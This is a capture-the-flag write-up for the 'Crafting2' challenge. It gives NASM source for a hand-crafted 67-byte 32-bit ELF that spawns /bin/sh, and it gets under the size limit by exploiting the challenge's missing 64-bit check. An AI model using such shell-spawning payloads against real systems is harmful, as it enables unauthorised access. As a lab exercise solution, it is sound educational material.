# Crafting2

Here, we have to actually make a very small elf file. The smallest possible file that gives a shell for 64 bit is 80 bytes but the challenge only allows 79 bytes. I tried to reduce one byte but failed and then realized that the challenge binary does not check if the elf is 64 bit and found out that the smallest file for 32 bit could be less than 79 bytes. Solution is below for 32 bit, this file is 67 bytes long and all of the elf sections are manually built out to save size, compile with `nasm -f bin -o 32 32.asm`

```x86asm
BITS 32

    org     0x00010000

    db      0x7F, "ELF"             ; e_ident
    dd      1                                       ; p_type
    dd      0                                       ; p_offset
    dd      $$                                      ; p_vaddr 
    dw      2                       ; e_type        ; p_paddr
    dw      3                       ; e_machine
    dd      _start                  ; e_version     ; p_filesz
    dd      _start                  ; e_entry       ; p_memsz
    dd      4                       ; e_phoff       ; p_flags
_start:
    mov     ebx, 0x1003c                  ; e_shoff       ; p_align
    jmp second
    ; inc     eax                     ; e_flags
    ; int     0x80
    db      0
    dw      0x34                    ; e_ehsize
    dw      0x20                    ; e_phentsize
    db      1                       ; e_phnum
                                    ; e_shentsize
                                    ; e_shnum
                                    ; e_shstrndx
filesize      equ     $ - $$

        dq 0
        second:
                mov eax, 11
                int 0x80
        binsh:
        db "/bin/sh"
```

There are a couple of blogs you can find which go over this but they focus on just calling exit 42 or printing "hello world", this has been modified to call `/bin/sh`.

Just `cat 32 | ./chall` to get the flag.
